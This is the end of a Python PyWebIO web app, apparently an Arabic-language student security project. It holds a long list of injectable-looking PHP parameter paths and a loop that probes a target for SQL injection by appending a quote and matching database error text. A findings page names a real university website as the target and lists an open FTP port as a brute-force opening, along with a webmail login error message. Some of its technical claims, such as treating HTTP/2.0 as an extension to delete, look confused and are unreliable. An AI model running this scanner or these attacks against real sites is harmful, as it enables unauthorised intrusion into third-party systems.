'enter.php?open=',
'base.php?rub=',
'gery.php?*[*]*=',
'include.php?cmd=',
'standard.php?dir=',
'layout.php?page=',
'index3.php?pageweb=',
'include.php?numero=',
'path.php?destino=',
'index3.php?home=',
'default.php?seite=',
'path.php?eval=',
'base.php?choix=',
'template.php?cont=',
'info.php?pagina=',
'default.php?x=',
'default.php?option=',
'gery.php?ki=',
'down*.php?second=',
'blank.php?path=',
'pagina.php?v=',
'file.php?pollname=',
'index3.php?var=',
'layout.php?goto=',
'pagina.php?incl=',
'home.php?action=',
'include.php?oldal=',
'print.php?left=',
'print.php?u=',
'nota.php?v=',
'home.php?str=',
'press.php?panel=',
'page.php?mod=',
'default.php?param=',
'down*.php?texto=',
'mod*.php?dir=',
'view.php?where=',
'blank.php?subject=',
'path.php?play=',
'base.php?l=',
'index2.php?rub=',
'general.php?opcion=',
'layout.php?xlink=',
'padrao.php?name=',
'pagina.php?nivel=',
'default.php?oldal=',
'template.php?k=',
'main.php?chapter=',
'layout.php?chapter=',
'layout.php?incl=',
'include.php?url=',
'base.php?sivu=',
'index.php?link=',
'sub*.php?cont=',
'info.php?oldal=',
'general.php?rub=',
'default.php?str=',
'head.php?ev=',
'sub*.php?path=',
'view.php?page=',
'main.php?j=',
'index2.php?basepath=',
'gery.php?qry=',
'main.php?url=',
'default.php?incl=',
'show.php?redirect=',
'index1.php?pre=',
'general.php?base_dir=',
'start.php?in=',
'show.php?abre=',
'index1.php?home=',
'home.php?ev=',
'index2.php?ki=',
'base.php?pag=',
'default.php?ir=',
'general.php?qry=',
'index2.php?home=',
'press.php?nivel=',
'enter.php?pr=',
'blank.php?loader=',
'start.php?cmd=',
'padrao.php?d=',
'sitio.php?recipe=',
'principal.php?read=',
'standard.php?showpage=',
'main.php?pg=',
'page.php?panel=',
'press.php?addr=',
'template.php?s=',
'main.php?tipo=',
'*inc*.php?ev=',
'padrao.php?page=',
'show.php?thispage=',
'home.php?secao=',
'main.php?start=',
'enter.php?mid=',
'press.php?id=',
'main.php?inc=',
'index3.php?cmd=',
'index.php?pname=',
'press.php?subject=',
'include.php?sec=',
'index3.php?xlink=',
'general.php?texto=',
'index3.php?go=',
'index.php?cmd=',
'index3.php?disp=',
'index3.php?left=',
'sub*.php?middle=',
'show.php?modo=',
'index1.php?pagina=',
'head.php?left=',
'enter.php?phpbb_root_path=',
'show.php?z=',
'start.php?basepath=',
'blank.php?strona=',
'template.php?y=',
'page.php?where=',
'layout.php?category=',
'index1.php?my=',
'principal.php?phpbb_root_path=',
'nota.php?channel=',
'page.php?choix=',
'start.php?xlink=',
'home.php?k=',
'standard.php?phpbb_root_path=',
'principal.php?middlePart=',
'mod*.php?m=',
'index.php?recipe=',
'template.php?path=',
'pagina.php?dir=',
'sitio.php?abre=',
'index1.php?recipe=',
'blank.php?page=',
'sub*.php?category=',
'*inc*.php?bOdy=',
'enter.php?middle=',
'home.php?path=',
'down*.php?pre=',
'base.php?w=',
'main.php?path=',
'nota.php?ir=',
'press.php?link=',
'gery.php?pollname=',
'down*.php?open=',
'down*.php?pageweb=',
'default.php?eval=',
'view.php?showpage=',
'show.php?get=',
'sitio.php?tipo=',
'layout.php?cont=',
'default.php?destino=',
'padrao.php?seccion=',
'down*.php?r=',
'main.php?param=',
'standard.php?e=',
'down*.php?in=',
'nota.php?include=',
'sitio.php?secao=',
'print.php?my=',
'general.php?abre=',
'general.php?link=',
'default.php?id=',
'standard.php?panel=',
'show.php?channel=',
'enter.php?r=',
'index3.php?phpbb_root_path=',
'gery.php?where=',
'head.php?middle=',
'sub*.php?load=',
'gery.php?sp=',
'show.php?chapter=',
'sub*.php?b=',
'general.php?adresa=',
'print.php?goto=',
'sub*.php?sp=',
'template.php?doshow=',
'padrao.php?base_dir=',
'index2.php?my=',
'include.php?w=',
'start.php?op=',
'main.php?section=',
'view.php?header=',
'layout.php?menue=',
'head.php?y=',
'sub*.php?content=',
'show.php?type=',
'base.php?id=',
'mod*.php?qry=',
'default.php?strona=',
'sitio.php?chapter=',
'gery.php?index=',
'nota.php?h=',
'page.php?oldal=',
'enter.php?panel=',
'blank.php?t=',
'start.php?pollname=',
'sub*.php?module=',
'enter.php?thispage=',
'mod*.php?index=',
'sitio.php?r=',
'sub*.php?play=',
'index2.php?doshow=',
'index2.php?chapter=',
'show.php?path=',
'gery.php?to=',
'info.php?base_dir=',
'gery.php?abre=',
'gery.php?pag=',
'view.php?channel=',
'default.php?mod=',
'index.php?op=',
'general.php?pre=',
'padrao.php?type=',
'template.php?pag=',
'standard.php?pre=',
'blank.php?ref=',
'down*.php?z=',
'general.php?inc=',
'home.php?read=',
'pagina.php?section=',
'default.php?basepath=',
'index.php?pre=',
'sitio.php?pageweb=',
'base.php?seite=',
'*inc*.php?j=',
'index2.php?filepath=',
'file.php?type=',
'index1.php?oldal=',
'index2.php?second=',
'index3.php?sekce=',
'info.php?filepath=',
'base.php?opcion=',
'path.php?category=',
'index3.php?start=',
'start.php?rub=',
'*inc*.php?i=',
'blank.php?pre=',
'general.php?channel=',
'index2.php?OpenPage=',
'page.php?section=',
'mod*.php?middle=',
'index1.php?goFile=',
'blank.php?action=',
'principal.php?loader=',
'sub*.php?op=',
'main.php?addr=',
'start.php?mid=',
'gery.php?secao=',
'pagina.php?tipo=',
'index.php?w=',
'head.php?where=',
'principal.php?tipo=',
'press.php?loader=',
'gery.php?showpage=',
'gery.php?go=',
'enter.php?start=',
'press.php?lang=',
'general.php?p=',
'index.php?sekce=',
'index2.php?get=',
'sitio.php?go=',
'include.php?cont=',
'sub*.php?where=',
'index3.php?index=',
'path.php?recipe=',
'info.php?loader=',
'print.php?sp=',
'page.php?phpbb_root_path=',
'path.php?bOdy=',
'principal.php?menue=',
'print.php?cont=',
'pagina.php?z=',
'default.php?mid=',
'blank.php?xlink=',
'sub*.php?oldal=',
'general.php?b=',
'include.php?left=',
'print.php?sivu=',
'press.php?OpenPage=',
'default.php?cont=',
'general.php?pollname=',
'template.php?nivel=',
'enter.php?page=',
'file.php?middle=',
'standard.php?str=',
'gery.php?get=',
'main.php?v=',
'down*.php?subject=',
'enter.php?sivu=',
'path.php?option=',
'index.php?strona=',
'index1.php?choix=',
'index2.php?f=',
'press.php?destino=',
'pagina.php?channel=',
'principal.php?b=',
'home.php?include=',
'head.php?numero=',
'general.php?ref=',
'main.php?dir=',
'gery.php?cont=',
'principal.php?type=',
'file.php?param=',
'default.php?secao=',
'path.php?pageweb=',
'info.php?r=',
'base.php?phpbb_root_path=',
'main.php?itemnav=',
'view.php?pg=',
'pagina.php?choix=',
'default.php?itemnav=',
'index2.php?cmd=',
'layout.php?url=',
'index.php?path=',
'index1.php?second=',
'start.php?modo=',
'index1.php?get=',
'index3.php?my=',
'sub*.php?left=',
'print.php?inc=',
'view.php?type=',
'path.php?*[*]*=',
'base.php?adresa=',
'index3.php?oldal=',
'standard.php?bOdy=',
'base.php?path=',
'principal.php?strona=',
'info.php?l=',
'template.php?left=',
'head.php?loc=',
'page.php?ir=',
'print.php?path=',
'down*.php?path=',
'sitio.php?opcion=',
'pagina.php?category=',
'press.php?menu=',
'index2.php?pref=',
'sitio.php?incl=',
'show.php?ki=',
'index3.php?x=',
'page.php?strona=',
'*inc*.php?open=',
'index3.php?secao=',
'standard.php?*[*]*=',
'template.php?basepath=',
'standard.php?goFile=',
'index2.php?ir=',
'file.php?modo=',
'gery.php?itemnav=',
'main.php?oldal=',
'down*.php?showpage=',
'start.php?destino=',
'blank.php?rub=',
'path.php?ir=',
'layout.php?var=',
'index1.php?texto=',
'start.php?pg=',
'index1.php?showpage=',
'info.php?go=',
'path.php?load=',
'index3.php?abre=',
'blank.php?where=',
'info.php?start=',
'page.php?secao=',
'nota.php?pag=',
'nota.php?second=',
'index2.php?to=',
'standard.php?name=',
'start.php?strona=',
'mod*.php?numero=',
'press.php?home=',
'info.php?z=',
'mod*.php?path=',
'blank.php?base_dir=',
'base.php?texto=',
'nota.php?secc=',
'index.php?tipo=',
'index.php?goto=',
'print.php?pag=',
'view.php?secao=',
'general.php?strona=',
'show.php?my=',
'page.php?e=',
'padrao.php?index=',
'gery.php?thispage=',
'start.php?base_dir=',
'default.php?tipo=',
'gery.php?panel=',
'standard.php?ev=',
'standard.php?destino=',
'general.php?middle=',
'main.php?basepath=',
'standard.php?q=',
'index1.php?tipo=',
'mod*.php?choix=',
'template.php?ir=',
'show.php?adresa=',
'general.php?mid=',
'index3.php?adresa=',
'pagina.php?sec=',
'template.php?secao=',
'home.php?w=',
'general.php?content=',
'sub*.php?recipe=',
'main.php?category=',
'enter.php?viewpage=',
'main.php?ir=',
'show.php?pageweb=',
'principal.php?ir=',
'default.php?pageweb=',
'index.php?oldal=',
'head.php?d=',
'gery.php?mid=',
'index.php?type=',
'standard.php?j=',
'show.php?oldal=',
'enter.php?link=',
'enter.php?content=',
'blank.php?filepath=',
'standard.php?channel=',
'base.php?*[*]*=',
'info.php?incl=',
'down*.php?include=',
'press.php?modo=',
'file.php?choix=',
'press.php?type=',
'blank.php?goto=',
'index3.php?showpage=',
'principal.php?subject=',
'start.php?chapter=',
'show.php?r=',
'pagina.php?thispage=',
'general.php?chapter=',
'page.php?base_dir=',
'page.php?qry=',
'show.php?incl=',
'page.php?*[*]*=',
'main.php?h=',
'file.php?seccion=',
'default.php?pre=',
'principal.php?index=',
'principal.php?inc=',
'home.php?z=',
'pagina.php?in=',
'show.php?play=',
'nota.php?subject=',
'default.php?secc=',
'default.php?loader=',
'padrao.php?var=',
'mod*.php?b=',
'default.php?showpage=',
'press.php?channel=',
'pagina.php?ev=',
'sitio.php?name=',
'page.php?option=',
'press.php?mid=',
'down*.php?corpo=',
'view.php?get=',
'print.php?thispage=',
'principal.php?home=',
'show.php?param=',
'standard.php?sivu=',
'index3.php?panel=',
'include.php?play=',
'path.php?cmd=',
'file.php?sp=',
'template.php?section=',
'view.php?str=',
'blank.php?left=',
'nota.php?lang=',
'path.php?sivu=',
'main.php?e=',
'default.php?ref=',
'start.php?seite=',
'default.php?inc=',
'print.php?disp=',
'home.php?h=',
'principal.php?loc=',
'index3.php?sp=',
'gery.php?var=',
'sub*.php?base_dir=',
'path.php?middle=',
'pagina.php?str=',
'base.php?play=',
'base.php?v=',
'sitio.php?sivu=',
'main.php?r=',
'file.php?nivel=',
'start.php?sivu=',
'template.php?c=',
'general.php?second=',
'sub*.php?mod=',
'home.php?loc=',
'head.php?corpo=',
'standard.php?op=',
'index2.php?inc=',
'info.php?pref=',
'base.php?basepath=',
'print.php?basepath=',
'*inc*.php?m=',
'base.php?home=',
'layout.php?strona=',
'padrao.php?url=',
'sitio.php?oldal=',
'pagina.php?read=',
'index1.php?go=',
'standard.php?s=',
'page.php?eval=',
'index.php?j=',
'pagina.php?pr=',
'start.php?secao=',
'template.php?*[*]*=',
'nota.php?get=',
'index3.php?link=',
'home.php?e=',
'gery.php?name=',
'nota.php?eval=',
'sub*.php?abre=',
'index2.php?load=',
'principal.php?in=',
'view.php?load=',
'mod*.php?action=',
'default.php?p=',
'head.php?c=',
'template.php?viewpage=',
'view.php?mid=',
'padrao.php?addr=',
'view.php?go=',
'file.php?basepath=',
'home.php?pre=',
'include.php?goFile=',
'layout.php?play=',
'index1.php?subject=',
'info.php?middlePart=',
'down*.php?pg=',
'sub*.php?bOdy=',
'index.php?option=',
'sub*.php?chapter=',
'default.php?t=',
'head.php?opcion=',
'nota.php?panel=',
'sitio.php?left=',
'show.php?include=',
'pagina.php?start=',
'head.php?choix=',
'index3.php?tipo=',
'index3.php?choix=',
'down*.php?channel=',
'base.php?pa=',
'nota.php?sekce=',
'show.php?l=',
'show.php?index=',
'blank.php?url=',
'start.php?thispage=',
'nota.php?play=',
'show.php?second=',
'enter.php?include=',
'principal.php?middle=',
'main.php?where=',
'padrao.php?link=',
'path.php?strona=',
'index3.php?read=',
'mod*.php?module=',
'standard.php?viewpage=',
'standard.php?pr=',
'*inc*.php?showpage=',
'pagina.php?ref=',
'path.php?pname=',
'padrao.php?mid=',
'info.php?eval=',
'include.php?path=',
'page.php?subject=',
'sub*.php?qry=',
'head.php?module=',
'nota.php?opcion=',
'head.php?abre=',
'base.php?str=',
'home.php?bOdy=',
'gery.php?module=',
'head.php?sivu=',
'page.php?inc=',
'pagina.php?header=',
'mod*.php?v=',
'home.php?doshow=',
'padrao.php?n=',
'index1.php?chapter=',
'padrao.php?basepath=',
'index.php?r=',
'index3.php?seccion=',
'sitio.php?mid=',
'index.php?where=',
'general.php?type=',
'pagina.php?goto=',
'page.php?pa=',
'default.php?menue=',
'main.php?goto=',
'index1.php?abre=',
'info.php?seccion=',
'index2.php?pa=',
'layout.php?pageweb=',
'nota.php?disp=',
'index1.php?bOdy=',
'default.php?nivel=',
'show.php?header=',
'down*.php?pag=',
'start.php?tipo=',
'standard.php?w=',
'index.php?open=',
'blank.php?menu=',
'general.php?nivel=',
'padrao.php?nivel=',
'*inc*.php?addr=',
'index.php?var=',
'home.php?redirect=',
'*inc*.php?link=',
'*inc*.php?incl=',
'padrao.php?corpo=',
'down*.php?url=',
'enter.php?goto=',
'down*.php?addr=',
'sub*.php?j=',
'principal.php?f=',
'sub*.php?menue=',
'index2.php?section=',
'general.php?my=',
'head.php?loader=',
'general.php?goto=',
'include.php?dir=',
'start.php?header=',
'blank.php?in=',
'base.php?name=',
'nota.php?goFile=',
'head.php?base_dir=',
'mod*.php?recipe=',
'press.php?pr=',
'padrao.php?*[*]*=',
'layout.php?opcion=',
'print.php?rub=',
'index.php?pr=',
'general.php?seite=',
'pagina.php?numero=',
'*inc*.php?pg=',
'nota.php?rub=',
'view.php?seite=',
'pagina.php?recipe=',
'index.php?pref=',
'page.php?action=',
'page.php?ev=',
'show.php?ir=',
'head.php?index=',
'mod*.php?pname=',
'view.php?ir=',
'*inc*.php?start=',
'principal.php?rub=',
'principal.php?corpo=',
'padrao.php?middle=',
'base.php?pname=',
'template.php?header=',
'view.php?sp=',
'main.php?name=',
'nota.php?m=',
'blank.php?open=',
'head.php?dir=',
'page.php?pname=',
'*inc*.php?k=',
'index.php?pollname=',
'head.php?oldal=',
'index1.php?str=',
'template.php?choix=',
'down*.php?pollname=',
'page.php?recipe=',
'template.php?corpo=',
'nota.php?sec=',
'info.php?*[*]*=',
'sub*.php?*[*]*=',
'page.php?q=',
'index1.php?type=',
'gery.php?y=',
'standard.php?lang=',
'gery.php?page=',
'index.php?action=',
'press.php?pname=',
'down*.php?v=',
'index3.php?second=',
'show.php?recipe=',
'main.php?pre=',
'file.php?numero=',
'print.php?str=',
'standard.php?link=',
'nota.php?OpenPage=',
'view.php?pollname=',
'print.php?l=',
'index.php?go=',
'standard.php?numero=',
'view.php?pr=',
'down*.php?read=',
'down*.php?action=']
        for x in link:
            error = ' your SQL syntax '
            siteo = f"{target_ip}/{x}'"
            req = requests.get(siteo)
            if error in req.text :
                print(target_ip,x,'Found')
                p2 = f"[✅] sql parameter {target_ip}{x} : Found Error sql injection"
                put_text(p2).style('direction:rtl;text-align:right;')
            else:
                print(target_ip,x,'No Error Found')
                p2 = f"[❌] sql parameter {target_ip}{x} : Not Found Found"
                put_text(p2).style('direction:rtl;text-align:right;')
    
    
    put_buttons(['Path مسارات'],onclick=[stattac]).style('width:119px;text-align:right;float:right;')
    put_buttons(['xss باراميترز'],onclick=[stattac1]).style('width:109px;text-align:right;float:right;')
    put_buttons(['sql ايجاد'],onclick=[stattac2]).style('width:169px;text-align:right;float:right;')
    put_html('<hr><br>')
    hold()
    
    
@config(title='التقاط الثغرات',description=' Exploit Scanner [البحث عن الثغرات]')
def explo():
    put_html('<center><h2>Security Project scanner [cyber]</h2></center>')
    put_html('<center><p>المرحلة الاخيرة البحث عن نقاط الضعف والثغرات وتأمين طرق المناسبة لحلها</p></center>')
    put_html('<h4>Site : [الموقع المستهدف] : http://aspu.edu.sy/ </h4>').style('color:green;text-align:center;')
    put_html('<img src="https://h.top4top.io/p_3048z8g1m1.png" width=100%>').style('text-align:right;')
    put_html('<hr>')
    
    
    put_html('''
                 <details>
                    <summary>Cyber APP Project [مشروع سايبر وخطواته]</summary>
                        <h4>نظام ويب لفحص نقاط الضعف في موقع الجامعة :</h4>
                        <a href='http://aspu.edu.sy/'>http://aspu.edu.sy/</a><br><br>
                        <details>
                            <summary>Exploit one [نقطة الضعف الاولى]</summary>
                            <h4>FTP brute attack [الهجوم على الاف تي بي]</h4>
                            <p>السبب بورت 21 مفتوح على الموقع</p>
                            <p>Link : ftp://aspu.edu.sy:21</p>
                            <h4>التأكد من صحة نقطة الضعف :</h4>
                            <p>عند فتح الرابط المذكور في الاعلى يطلب فتح تطبيق للتواصل مع البورت لمحاولة رفع ملفات هذا يعني ان هناك تطبيق لديكم متواصل مغ حدمة الاف تي بي وتقوم برفعها على الانترنت بتطبيق مثل فايل زيلا وغيرها</p>
                        </details>
                        
                        <details>
                            <summary>Exploit tow [نقطة الضعف الثانية]</summary>
                            <h4>Extention HTTP/2.0 [يجب حذفها]</h4>
                            <p>مع العلم ان الموقع غليه حماية قوية :</p>
                            <p>Security site : HSTS</p>
                            <h4>التأكد من صحة نقطة الضعف :</h4>
                            <p>عند ارسال طلب للموقع يتم اخذ اول طلب يقوم بغلقه مباشرة لكن بسبب هذه الاضافة يأخذ نسخى من الطلب ويبقى شغال بحيث يترك مجال لعمليات التسلل بعمليات الهجوم الغاشم</p>
                        </details>
                        
                        <details>
                            <summary>Exploit three [نقطة الضعف الثالثة]</summary>
                            <h4>رسالة الخطأ التي تظهر اثناء عملية تسجيل الدخول</h4>
                            <p>يعتمد عليها الهاكرز طالما تظهر رسالة الخطا سيتم الهجوم على غاية حدوث تغيير في الرسالة او اختفائها</p>
                            <p>Link : https://webmail.aspu.edu.sy</p>
                            <h4>التأكد من صحة نقطة الضعف :</h4>
                            <p>message : فشل تسجيل الدخول</p>
                            <p>يجب اخفاء عملية توكن التي تظهر في سورس البيج والغاء رسالة التي توضح للمستخدم ان الداتا غلط واستبدالها بتحويل الى صفحة ثانية وعرض رسالة فيها</p>
                            <p>الكود المسؤول عن اظهار الرسالة : جافا سكربت في دالة :</p>
                            <pre>
                            +---------------------+
                            |    $(function() {   |
                            |    rcmail.init();   |
                            |    });              |
                            +---------------------+
                            </pre>
                        </details>
                        
                </details>
                 
                 
        ''').style('direction:rtl;text-align:right;')
    
    
start_server([app,ip,port,subdoamin,pather,explo] ,port=16666, debug=True)
